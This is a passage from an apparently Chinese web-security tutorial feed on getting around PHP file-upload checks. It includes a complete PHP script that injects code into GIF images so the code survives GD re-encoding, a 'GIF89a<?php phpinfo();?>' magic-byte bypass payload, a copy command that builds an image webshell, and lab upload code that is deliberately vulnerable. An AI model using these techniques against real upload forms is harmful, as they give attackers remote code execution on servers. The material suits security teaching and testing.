格式将图像输出到浏览器或文件。</li><li>语法：<blockquote><ul><li><code>bool imagegif ( resource image [, string filename] )</code></li><li><code>bool imagejpeg ( resource image [, string filename [, int quality]] )</code></li><li><code>bool imagepng ( resource image [, string filename] )</code></li><li><code>bool imagewbmp ( resource image [, string filename [, int foreground]] )</code></li></ul></blockquote></li><li>参数说明：<blockquote><ul><li>image    欲输出的图像资源，如 imagecreate() 或 imagecreatefrom 系列函数的返回值</li><li>filename    可选，指定输出图像的文件名。如果省略，则原始图像流将被直接输出。</li><li>quality    可选，指定图像质量，范围从 0（最差质量，文件最小）到 100（最佳质量，文件最大），默认75 ，imagejpeg() 独有参数</li><li>foreground    可选，指定前景色，默认前景色是黑色，imagewbmp() 独有参数</li></ul></blockquote></li></ul></li></ul><h4 id="2-3-上传利用copy制作的图片木马"><a href="#2-3-上传利用copy制作的图片木马" class="headerlink" title="2.3 上传利用copy制作的图片木马"></a>2.3 上传利用copy制作的图片木马</h4><ul><li><p>图片demotest.gif 含phpinfo()WebShell，测试结果<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload02.png" alt=""></p></li><li><p>分析上传成功的test.gif和demotest.gif<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload03.png" alt=""></p></li></ul><h4 id="2-4-图片转换代码"><a href="#2-4-图片转换代码" class="headerlink" title="2.4 图片转换代码"></a>2.4 图片转换代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Author: rickchen.vip(at)gmail.com</span></span><br><span class="line"><span class="comment"> * Date: 2015-04-05</span></span><br><span class="line"><span class="comment"> * Desc: Use Similar-Block-Attack to bypass PHP-GD process to RCE</span></span><br><span class="line"><span class="comment"> * Reference: http://www.secgeek.net/bookfresh-vulnerability/</span></span><br><span class="line"><span class="comment"> * Usage: php codeinj.php demo.gif "&lt;?php phpinfo();?&gt;"</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gd_process</span><span class="params">($src_img, $dst_img)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment"># you can redefine the GD process</span></span><br><span class="line">        $im = imagecreatefromgif($src_img);</span><br><span class="line">        imagegif($im, $dst_img);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        printf(<span class="string">"%s\n"</span>, $e-&gt;getMessage());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_similar_block</span><span class="params">($src_img, $dst_img, $block_len, $slow=false)</span> </span>&#123;</span><br><span class="line">    $src_data = fread(fopen($src_img, <span class="string">"rb"</span>), filesize($src_img));</span><br><span class="line">    $dst_data = fread(fopen($dst_img, <span class="string">"rb"</span>), filesize($dst_img));</span><br><span class="line">    $src_index = <span class="number">0</span>;</span><br><span class="line">    $pre_match_array = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ($src_index &lt; (strlen($src_data) - $block_len)) &#123;</span><br><span class="line">        $find_data = substr($src_data, $src_index, $block_len);</span><br><span class="line"></span><br><span class="line">        $dst_index = <span class="number">0</span>;</span><br><span class="line">        $found = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">while</span> ($dst_index &lt; (strlen($dst_data) - $block_len)) &#123;</span><br><span class="line">            $temp_data = substr($dst_data, $dst_index, $block_len);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">0</span> === strcmp($find_data, $temp_data)) &#123;</span><br><span class="line">                $match = <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">"src_offset"</span> =&gt; $src_index,</span><br><span class="line">                    <span class="string">"dst_offset"</span> =&gt; $dst_index</span><br><span class="line">                );</span><br><span class="line">                $pre_match_array[] = $match;</span><br><span class="line">                $found = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                printf("Similar block found&gt; src_offset: %d\n", $src_index);</span></span><br><span class="line"><span class="comment">                printf("                     dst_offset: %d\n", $dst_index);</span></span><br><span class="line"><span class="comment">                printf("                   similar_data: %s\n", str2hex($temp_data));</span></span><br><span class="line"><span class="comment">                printf("                 similar_length: %s\n\n", strlen($temp_data));</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($found &amp;&amp; $slow == <span class="keyword">false</span>)</span><br><span class="line">                $dst_index += $block_len;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                $dst_index++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($found &amp;&amp; $slow == <span class="keyword">false</span>)</span><br><span class="line">            $src_index += $block_len;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            $src_index++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $pre_match_array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inject_code_to_src_img</span><span class="params">($src_img, $pre_match_array, $injection_code)</span> </span>&#123;</span><br><span class="line">    $src_data = fread(fopen($src_img, <span class="string">"rb"</span>), filesize($src_img));</span><br><span class="line">    $inj_len = strlen($injection_code);</span><br><span class="line"></span><br><span class="line">    $find_n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">foreach</span> ($pre_match_array <span class="keyword">as</span> $similar_block) &#123;</span><br><span class="line">        <span class="comment">#printf("Trying inject code to source image with offset: %d, length: %d\n", $similar_block["src_offset"], $inj_len);</span></span><br><span class="line">        $mod_src_data = substr($src_data, <span class="number">0</span>, $similar_block[<span class="string">"src_offset"</span>]).$injection_code.substr($src_data, $similar_block[<span class="string">"src_offset"</span>] + $inj_len);</span><br><span class="line">        $temp_img = sys_get_temp_dir().<span class="string">"/"</span>.$src_img.<span class="string">".mod"</span>;</span><br><span class="line">        $temp_cvt_img = $temp_img.<span class="string">".gd"</span>;</span><br><span class="line">        fwrite(fopen($temp_img, <span class="string">"wb"</span>), $mod_src_data);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!gd_process($temp_img, $temp_cvt_img)) &#123;</span><br><span class="line">            <span class="comment">#printf("PHP-GD process() the image modified error, offset: %d\n", $similar_block["src_offset"]);</span></span><br><span class="line">            <span class="comment">#printf("                                           length: %d\n\n", $inj_len);</span></span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (check_code($temp_cvt_img, $injection_code)) &#123;</span><br><span class="line">                $fuck_img = <span class="string">"gd_"</span>.$src_img;</span><br><span class="line">                fwrite(fopen($fuck_img, <span class="string">"wb"</span>), $mod_src_data);</span><br><span class="line">                printf(<span class="string">"Inject code to source image successful with offset: %d\n"</span>, $similar_block[<span class="string">"src_offset"</span>]);</span><br><span class="line">                printf(<span class="string">"Saving result \"%s\", have fun! :)\n"</span>, $fuck_img);</span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">                <span class="comment">#printf("Modified image doesn't work well, offset: %d, retry...\n", $similar_block["src_offset"]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_code</span><span class="params">($src_img, $injection_code)</span> </span>&#123;</span><br><span class="line">    $data = fread(fopen($src_img, <span class="string">"rb"</span>), filesize($src_img));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> strpos($data, $injection_code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str2hex</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $hex = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($str); $i++)&#123;</span><br><span class="line">        $hex .= sprintf(<span class="string">"%02x"</span>, (ord($str[$i])));;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex2str</span><span class="params">($hex)</span></span>&#123;</span><br><span class="line">    $str = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($hex)<span class="number">-1</span>; $i+=<span class="number">2</span>)&#123;</span><br><span class="line">        $str .= chr(hexdec($hex[$i].$hex[$i+<span class="number">1</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* main */</span></span><br><span class="line"><span class="keyword">if</span> ($argc &lt; <span class="number">3</span>) &#123;</span><br><span class="line">    printf(<span class="string">"Usage: php %s &lt;src_img&gt; &lt;inj_code&gt;\n"</span>, $argv[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$slow = <span class="keyword">false</span>;</span><br><span class="line">$src_img = $argv[<span class="number">1</span>];</span><br><span class="line">$injection_code = $argv[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">$img_info = getimagesize($src_img);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GIF image type value "1" */</span></span><br><span class="line"><span class="keyword">if</span> ($img_info[<span class="number">2</span>] == <span class="string">'1'</span>) &#123;</span><br><span class="line">    $cvt_img = sys_get_temp_dir().<span class="string">"/"</span>.basename($src_img);</span><br><span class="line">    <span class="keyword">if</span> (!gd_process($src_img, $cvt_img)) &#123;</span><br><span class="line">        printf(<span class="string">"PHP-GD process() function error, please check out.\n"</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    printf(<span class="string">"This script only support GIF image.\n"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">$block_len = strlen($injection_code);</span><br><span class="line">$pre_match_array = find_similar_block($src_img, $cvt_img, $block_len, $slow);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sizeof($pre_match_array)) &#123;</span><br><span class="line">    inject_code_to_src_img($src_img, $pre_match_array, $injection_code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    printf(<span class="string">"Not found any similar %d bytes block.\n"</span>, strlen($injection_code));</span><br><span class="line">&#125;</span><br><span class="line">printf(<span class="string">"Cant find any useful similar block to inject code, but take it easy. :(\n"</span>);</span><br></pre></td></tr></table></figure><h4 id="2-5-使用图片转换代码，转换代码"><a href="#2-5-使用图片转换代码，转换代码" class="headerlink" title="2.5 使用图片转换代码，转换代码"></a>2.5 使用图片转换代码，转换代码</h4><ul><li><p>转换操作如图<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload04.png" alt=""></p></li><li><p>查看demo.gif,经过转换后的gd_demo.gif<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload05.png" alt=""></p></li></ul><h4 id="2-6-上传2-5转换后的图片gd-demo-gif"><a href="#2-6-上传2-5转换后的图片gd-demo-gif" class="headerlink" title="2.6 上传2.5转换后的图片gd_demo.gif"></a>2.6 上传2.5转换后的图片gd_demo.gif</h4><ul><li><p>测试结果<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload06.png" alt=""></p></li><li><p>再次分析gd_demo.gif和上传成功的test.gif<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20403upload07.png" alt=""></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fileupload </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【文件上传（三）：服务端检测绕过】3.4服务端文件内容检测绕过</title>
      <link href="/2020/03/28/3.4%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B/"/>
      <url>/2020/03/28/3.4%20%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="本文主要内容"><a href="#本文主要内容" class="headerlink" title="本文主要内容"></a>本文主要内容</h3><ul><li>简单文件头检测、文件幻数检测</li><li>完整文件结构检测</li></ul><a id="more"></a><h3 id="0x01-简单文件头检测"><a href="#0x01-简单文件头检测" class="headerlink" title="0x01 简单文件头检测"></a>0x01 简单文件头检测</h3><ul><li><p>文件幻数检测</p><p>  JPG ： FF D8 FF E0 00 10 4A 46 49 46</p><p>  GIF ： 47 49 46 38 39 61 (GIF89a)</p><p>  PNG： 89 50 4E 47</p></li><li><p>如下图所示代码，是通过文件头的起始部分进行匹配，比较简单的一种文件类型检测方法。</p></li></ul><h4 id="简单文件头检测测试示例"><a href="#简单文件头检测测试示例" class="headerlink" title="简单文件头检测测试示例"></a>简单文件头检测测试示例</h4><ul><li>代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = <span class="string">"uploads/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传出错！"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;div id=<span class="string">"upload_panel"</span>&gt;</span><br><span class="line">    &lt;ol&gt;</span><br><span class="line">        &lt;li&gt;</span><br><span class="line">            &lt;h3&gt;上传区&lt;/h3&gt;</span><br><span class="line">            &lt;form enctype=<span class="string">"multipart/form-data"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">                &lt;p&gt;请选择要上传的图片：&lt;p&gt;</span><br><span class="line">                &lt;input class="input_file" type="file" name="upload_file"/&gt;</span><br><span class="line">                &lt;input class="button" type="submit" name="submit" value="上传"/&gt;</span><br><span class="line">            &lt;/form&gt;</span><br><span class="line">            &lt;div id=<span class="string">"msg"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span> </span><br><span class="line">                    <span class="keyword">if</span>($msg != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"提示："</span>.$msg;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id=<span class="string">"img"</span>&gt;</span><br><span class="line">                <span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">if</span>($is_upload)&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">'&lt;img src="'</span>.$img_path.<span class="string">'" width="250px" /&gt;'</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="meta">?&gt;</span></span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/li&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/ol&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><ul><li><p>如果仅在含phpinfo()的文件（phpinfo.php）将其修改为phpinfo.gif是不行的，需在文件内容开头添加gif的文件幻数GIF8a</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>测试：利用burpsuite截包，repeater重放功能<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload01.png" alt=""></p></li><li><p>利用：利用本地文件包含，访问已上传的图片文件（因为图片无法直接被解析）<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload02.png" alt=""></p></li></ul><h3 id="0x02-完整文件结构检测"><a href="#0x02-完整文件结构检测" class="headerlink" title="0x02 完整文件结构检测"></a>0x02 完整文件结构检测</h3><ul><li>通过调用图像函数（如：getimagesize/imagecreatefromgif/imagecreatefrompng）,进行检测文件是否为图像，需要文件内容保持相对完整，所以无法通过上追加头部起始字节的方法进行绕过。</li><li>但是对于getimagesize，如果在文件头追加GIF89a，也是可以成功上传的，但是imagecreatefromgif等无法绕过</li></ul><h4 id="2-1-绕过方法"><a href="#2-1-绕过方法" class="headerlink" title="2.1 绕过方法"></a>2.1 绕过方法</h4><ul><li>将图片文件与欲上传的文件进行合并绕过检测</li><li>copy命令进行文件合并</li><li>合并后的文件只要未经过清洗或缩放等操作即可通过检测，并保存欲上传文件的完整性</li><li>上传文件的图片部分在解析为PHP时会以乱码显示，建议与尽量小的文件进行合并，否则会有大量乱码</li></ul><h4 id="2-2图片一句话木马制作"><a href="#2-2图片一句话木马制作" class="headerlink" title="2.2图片一句话木马制作"></a>2.2图片一句话木马制作</h4><ul><li>创建一个文件夹，包含a.bat,tp.gif,yjh.php</li><li>a.bat内容为cmd；yjh.php内容为<code>&lt;?php phpinfo(): ?&gt;</code></li><li>点击bat文件进入DOS命令，写入”copy  tp.gif/b+yjh.php  tpyjh.gif” 回车<br><img src="https://cdn.jsdelivr.net/gh/fishni/ImgHosting/Images/A01/20402upload03.png" alt=""></li></ul><h4 id="2-3实战示例"><a href="#2-3实战示例" class="headerlink" title="2.3实战示例"></a>2.3实战示例</h4><ul><li>代码：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>/&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = isImage($temp_file);</span><br><span class="line"><span class="keyword">if</span>(@imagecreatefromgif($temp_file))&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">$msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$img_path = <span class="string">"uploads/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).$file_type;</span><br><span class="line"><span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">$is_upload = <span class="keyword">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$msg = <span 